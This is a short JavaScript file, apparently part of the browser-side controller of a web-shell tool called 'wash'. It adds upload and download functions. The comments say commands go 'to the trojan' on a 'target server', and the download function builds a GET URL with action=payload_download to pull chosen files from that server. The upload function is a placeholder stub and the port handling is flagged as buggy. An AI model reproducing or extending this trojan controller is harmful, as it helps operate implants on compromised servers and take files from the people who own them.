// Here we pop open the wash object once again to patch in some tailored
// functionality.
wash.file = {
    up: function(){
        console.log('up');

        // assemble the command to send to the trojan
        wash.command.action = 'payload_blah';
        wash.command.cmd    = '';
        wash.command.args   = {one: 1, two: 2} ;

        // send the request upstream
        wash.send_and_receive();
    },

    // downloads a file
    down: function(args){
        // alert the user if we're switching to GET from another request type
        if(wash.connection.request_type != 'get'){
            var msg = "In order to download a file, a GET request must necessarily " +
                      "be made against the target server. Continue?";
            
            // cancel if the user is unwilling to change request types
            if(!confirm(msg)){ return false; }
        }

        // assemble the URL for the file download
        var url = wash.connection.protocol + '://';
        // @todo @bug: deal with the port here
        url += wash.connection.url + '?';
        url += 'args[file]=' + args.file + '&';
        url += 'action=payload_download';

        // download the file
        window.location.href = url;
    },
}
